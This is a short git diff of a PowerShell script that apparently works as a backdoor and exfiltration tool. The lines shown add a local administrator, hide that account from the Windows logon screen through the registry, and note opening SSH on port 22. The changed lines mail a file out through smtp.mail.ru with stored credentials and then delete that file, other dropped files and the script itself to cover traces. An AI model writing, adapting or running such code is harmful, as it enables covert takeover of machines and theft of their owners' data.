@@ -32,7 +32,8 @@ Add-LocalGroupMember -Group "Administrators" -Member $user
 reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /f /d 0 /v $user
 
 
-Send-MailMessage -From $email -To $email -Subject "test" -Attachment .\$mail_attach -SmtpServer smtp.mail.ru -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, $emailp)
+# Yeah...
+Send-MailMessage -From $email -To $email -Subject "test1" -Attachment .\$mail_attach -SmtpServer smtp.mail.ru -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, $emailp)
 
 
 # Open SSH and port 22 (add a rule in firewall as well)
@@ -53,4 +54,5 @@ Remove-Item .\7r6lYgoLlv.txt
 Remove-Item .\etgtYmwQUO.txt
 Remove-Item .\f4EWj29Hgq.txt
 Remove-Item .\OWEeX45e3U.txt
+Remove-Item .\$mail_attach
 Remove-Item $PSCommandPath -Force
